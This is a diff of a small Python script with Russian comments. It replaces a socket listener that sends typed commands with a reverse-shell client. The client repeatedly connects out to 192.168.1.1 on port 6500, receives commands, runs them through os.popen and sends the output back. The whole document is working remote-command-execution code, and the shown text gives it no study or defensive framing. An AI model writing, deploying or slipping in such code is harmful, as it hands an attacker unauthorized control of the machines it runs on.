@@ -1,26 +1,33 @@
 import socket
+import os
+
+def ExecuteCommand(command):
+        output = os.popen(command).read()
+        return output
 
 def main():
-    host = "192.168.1.1" # ip который будем прослушивать
-    port = 6500 # порт
- 
-    s = socket.socket() # создаем сокет
-    s.bind((host,port))
- 
-    s.listen(1)
-    print("Waiting for connection...")
-    connection, address = s.accept() # подключаемся
-    print("Connection from " + str(address))
-    while True:
-        try:
-            toSend = input("-> ")
-            connection.send(toSend.encode()) # отправляем команду
-            data = connection.recv(1024).decode() # получаем результат
-            print(data) # выводим на экран
-        except:
-            break
-    print("Connection refused") # в случае, если соединение разорванно
-    connection.close()
- 
+        host = "192.168.1.1" # ip который будем использовать
+        port = 6500 # порт
+        while True:
+            while True:
+                try:
+                    s = socket.socket() # создаем сокет
+                    s.connect((host,port))  # подключаемся
+                except:
+                    break
+    
+                while True:
+                    try:
+                        data = s.recv(1024).decode() # получаем команду
+                        output = ExecuteCommand(str(data))
+                        if len(output) == 0:
+                            s.send(" ".encode()) # в случае, если рзультат
+                            # пустой, отправляем пробел
+                        else:
+                            s.send(output.encode()) # отправляем результат
+                    except:
+                        break
+        s.close()
+
 if __name__ == '__main__':
     main()
